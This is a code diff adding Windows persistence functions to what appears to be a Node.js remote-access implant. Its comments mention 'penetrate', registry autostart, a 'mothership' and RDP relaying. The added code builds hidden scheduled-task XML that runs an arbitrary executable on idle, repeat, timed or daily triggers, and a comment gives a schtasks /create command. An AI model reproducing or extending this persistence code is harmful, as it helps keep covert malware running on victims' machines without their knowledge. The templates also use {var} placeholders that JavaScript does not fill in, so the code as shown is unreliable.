@@ -48,6 +48,7 @@ initProcessList()
 // --- TASKS LIST ---
 
 // ! startup: penetrate --> register autostart in registry, folder locations + register tasks // anchor
+// ! startup: reschedule --> obtain 
 
 // ! improve logging / logmsg
 // !! improve mothership logging
@@ -55,7 +56,8 @@ initProcessList()
 // ! modify noderelay to handle browser rdp
 // ! read/write/parse/retrieve config
 
-// ! BUG: execjob script must terminate upon completion --> when finished should exit process
+// ! BUG: execjob script must terminate upon completion --> when finished should 
+// exit process
 
 // ! creating/deleting/query tasks and registry not natively supported by node, have to implement
 // bat/cmd, ps1, vbs failover
@@ -3518,6 +3520,224 @@ function logMsgMothership(msg) {
 
 function logEventMothership(event_code, kvp) {
     // TODO: write msgstr to mothership
+}
+
+// ---
+
+function createTask(taskname) {
+    /*
+    let taskxmlfuncs = {
+        'IdleTask':getIdleTaskXMLStr
+        'RepTask':getRepTaskXMLStr
+        'TimeTask':getTimeTaskXMLStr
+        'DailyTask':getDailyTaskXMLStr
+    };
+    */
+
+    // generate task xml string
+    // save to xml file
+    // invoke execCreatTask
+}
+
+function execCreatTask() {
+    // schtasks /create /XML "taskxmlpath" /tn "taskname" /F
+}
+
+function getIdleTaskXMLStr(intaskname, tasktimestr, pexe, args, workdir) {
+    // tasktimestr --> 2005-01-01T00:08:00
+    let taskxmlstr = `
+        <?xml version="1.0" encoding="UTF-16" ?>
+        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+        <RegistrationInfo>
+            <Date>2026-04-26T09:45:36.6514157</Date>
+            <Author>test</Author>
+            <URI>{intaskname}</URI>
+        </RegistrationInfo> 
+        <Triggers>
+            <IdleTrigger>
+                <StartBoundary>{tasktimestr}</StartBoundary>
+            </IdleTrigger>
+        </Triggers>
+        <Settings>
+            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+            <AllowHardTerminate>false</AllowHardTerminate>
+            <StartWhenAvailable>true</StartWhenAvailable>
+            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+            <IdleSettings>
+                <Duration>PT1M</Duration>
+                <WaitTimeout>PT1H</WaitTimeout>
+                <StopOnIdleEnd>false</StopOnIdleEnd>
+                <RestartOnIdle>false</RestartOnIdle>
+            </IdleSettings>
+            <AllowStartOnDemand>true</AllowStartOnDemand>
+            <Enabled>true</Enabled>
+            <Hidden>true</Hidden>
+            <RunOnlyIfIdle>false</RunOnlyIfIdle>
+            <WakeToRun>true</WakeToRun>
+            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+            <Priority>7</Priority>
+        </Settings>
+        <Actions Context="Author">
+            <Exec>
+                <Command>{pexe}</Command>
+                <Arguments>{args}</Arguments>
+                <WorkingDirectory>{workdir}</WorkingDirectory>
+            </Exec>
+        </Actions>
+        </Task>`;
+
+    return taskxmlstr;
+}
+
+function getRepTaskXMLStr(intaskname,tskxmltime,pexe,args,workdir) {
+    let taskxmlstr = `
+        <?xml version="1.0" encoding="UTF-16" ?>
+        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+            <RegistrationInfo>
+                <Date>2026-04-26T09:45:36.6514157</Date>
+                <Author>test</Author>
+                <URI>{intaskname}</URI>
+            </RegistrationInfo> 
+            <Triggers> 
+                <CalendarTrigger> 
+                    <StartBoundary>2026-04-30T09:00:00</StartBoundary> 
+                    <Repetition> 
+                        <Interval>PT{tskxmltime}M</Interval> 
+                        <StopAtDurationEnd>false</StopAtDurationEnd> 
+                    </Repetition> 
+                    <ScheduleByDay> 
+                        <DaysInterval>1</DaysInterval> 
+                    </ScheduleByDay> 
+                </CalendarTrigger> 
+            </Triggers> 
+            <Settings>
+                <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+                <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+                <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+                <AllowHardTerminate>false</AllowHardTerminate>
+                <StartWhenAvailable>true</StartWhenAvailable>
+                <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+                <IdleSettings>
+                    <StopOnIdleEnd>false</StopOnIdleEnd>
+                    <RestartOnIdle>false</RestartOnIdle>
+                </IdleSettings>
+                <AllowStartOnDemand>true</AllowStartOnDemand>
+                <Enabled>true</Enabled>
+                <Hidden>true</Hidden>
+                <RunOnlyIfIdle>false</RunOnlyIfIdle>
+                <WakeToRun>true</WakeToRun>
+                <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+                <Priority>7</Priority>
+            </Settings>
+            <Actions Context="Author">
+                <Exec>
+                    <Command>{pexe}</Command>
+                    <Arguments>{args}</Arguments>
+                    <WorkingDirectory>{workdir}</WorkingDirectory>
+                </Exec>
+            </Actions>
+        </Task>`;
+
+    return taskxmlstr;
+}
+
+function getTimeTaskXMLStr(intaskname,timetaskxmltime,pexe,args,workdir) {
+    let taskxmlstr = `
+        <?xml version="1.0" encoding="UTF-16"?>
+        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+        <RegistrationInfo>
+            <Date>2026-04-26T09:45:36.6514157</Date>
+            <Author>test</Author>
+            <URI>{intaskname}</URI>
+        </RegistrationInfo> 
+        <Triggers> 
+            <TimeTrigger> 
+                <StartBoundary>2008-09-01T03:00:00</StartBoundary> 
+                <Repetition> 
+                <Interval>PT{timetaskxmltime}M</Interval> 
+                </Repetition> 
+                <RandomDelay>PT30S</RandomDelay> 
+            </TimeTrigger> 
+        </Triggers> 
+        <Settings>
+            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+            <AllowHardTerminate>false</AllowHardTerminate>
+            <StartWhenAvailable>true</StartWhenAvailable>
+            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+            <IdleSettings>
+                <StopOnIdleEnd>false</StopOnIdleEnd>
+                <RestartOnIdle>false</RestartOnIdle>
+            </IdleSettings>
+            <AllowStartOnDemand>true</AllowStartOnDemand>
+            <Enabled>true</Enabled>
+            <Hidden>true</Hidden>
+            <RunOnlyIfIdle>false</RunOnlyIfIdle>
+            <WakeToRun>true</WakeToRun>
+            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+            <Priority>7</Priority>
+        </Settings>
+        <Actions Context="Author">
+        <Exec>
+            <Command>{pexe}</Command>
+            <Arguments>{args}</Arguments>
+            <WorkingDirectory>{workdir}</WorkingDirectory>
+        </Exec>
+        </Actions>
+        </Task>`;
+
+    return taskxmlstr;
+}
+
+function getDailyTaskXMLStr(intaskname,pexe,args,workdir) {
+    let taskxmlstr = `
+        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+        <RegistrationInfo>
+            <Date>2026-04-26T09:45:36.6514157</Date>
+            <Author>test</Author>
+            <URI>{intaskname}</URI>
+        </RegistrationInfo> 
+        <Triggers>
+            <CalendarTrigger>
+                <StartBoundary>2026-04-26T09:45:21</StartBoundary>
+                <Enabled>true</Enabled>
+                <ScheduleByDay>
+                    <DaysInterval>1</DaysInterval>
+                </ScheduleByDay>
+            </CalendarTrigger>
+        </Triggers>
+        <Settings>
+            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+            <AllowHardTerminate>false</AllowHardTerminate>
+            <StartWhenAvailable>true</StartWhenAvailable>
+            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+            <IdleSettings>
+                <StopOnIdleEnd>false</StopOnIdleEnd>
+                <RestartOnIdle>false</RestartOnIdle>
+            </IdleSettings>
+            <AllowStartOnDemand>true</AllowStartOnDemand>
+            <Enabled>true</Enabled>
+            <Hidden>true</Hidden>
+            <RunOnlyIfIdle>false</RunOnlyIfIdle>
+            <WakeToRun>true</WakeToRun>
+            <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+            <Priority>7</Priority>
+        </Settings>
+        <Actions Context="Author">
+            <Exec>
+                <Command>{pexe}</Command>
+                <Arguments>{args}</Arguments>
+                <WorkingDirectory>{workdir}</WorkingDirectory>
+            </Exec>
+        </Actions>
+        </Task>`;
+
+    return taskxmlstr;
 }
 
 // ---
